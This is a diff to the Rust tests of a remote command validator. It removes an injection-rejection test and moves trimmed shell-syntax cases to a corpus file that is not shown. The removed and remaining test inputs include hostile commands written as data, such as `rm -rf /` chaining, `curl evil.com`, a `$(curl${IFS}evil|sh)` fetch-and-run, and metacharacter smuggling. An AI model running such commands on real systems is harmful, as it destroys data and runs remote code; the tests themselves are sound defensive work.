@@ -256,19 +256,9 @@ mod tests {
         validate_command(&p(), "docker compose up -d").unwrap();
         validate_command(&p(), "git pull").unwrap();
     }
-    #[test]
-    fn rejects_injection_attempts() {
-        for evil in [
-            "docker compose ps; rm -rf /",
-            "git pull && curl evil.com",
-            "git pull$(rm -rf /)",
-        ] {
-            assert!(
-                validate_command(&p(), evil).is_err(),
-                "should reject: {evil}"
-            );
-        }
-    }
+    // Commands refused whatever the pattern says are in
+    // `tests/corpus/commands.txt`.
+
     #[test]
     fn refuses_shell_syntax_whatever_the_pattern() {
         // The remote login shell runs the command, so a broad pattern must
@@ -277,32 +267,10 @@ mod tests {
         q.allowed_commands = vec!["git checkout \\S+".into(), "echo .*".into()];
         for evil in [
             "git checkout $(curl${IFS}evil|sh)",
-            "git checkout `id`",
-            "git checkout $HOME",
             "git checkout a;id",
-            "git checkout a|id",
-            "git checkout a&&id",
-            "git checkout a>x",
-            "git checkout <x",
-            "git checkout (a)",
             "echo a\nid",
-            "echo a\rb",
-            "echo a\tb",
-            "echo 'a'",
-            "echo \"a\"",
-            "git checkout a\\b",
-            "git checkout *",
-            "git checkout a?",
-            "git checkout [ab]",
-            "git checkout {a,b}",
-            "git checkout ~",
-            "git checkout !1",
-            "git checkout #x",
             "git checkout =ls",
-            "git checkout ä",
             "echo  a",
-            "echo a ",
-            " git checkout a",
         ] {
             let err = validate_command(&q, evil).unwrap_err();
             assert!(
